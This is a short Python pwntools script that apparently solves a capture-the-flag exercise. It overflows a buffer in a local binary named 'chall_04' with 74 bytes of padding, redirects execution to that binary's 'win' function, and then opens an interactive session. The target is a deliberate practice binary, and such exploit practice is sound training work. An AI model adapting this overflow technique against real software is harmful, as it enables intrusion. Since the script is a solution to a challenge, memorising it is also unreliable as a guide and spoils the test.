from pwn import *
p=process("./chall_04")
binary=ELF("./chall_04")
p.recv()
p.sendline(74*b"A" + p64(binary.sym.win))
p.interactive()
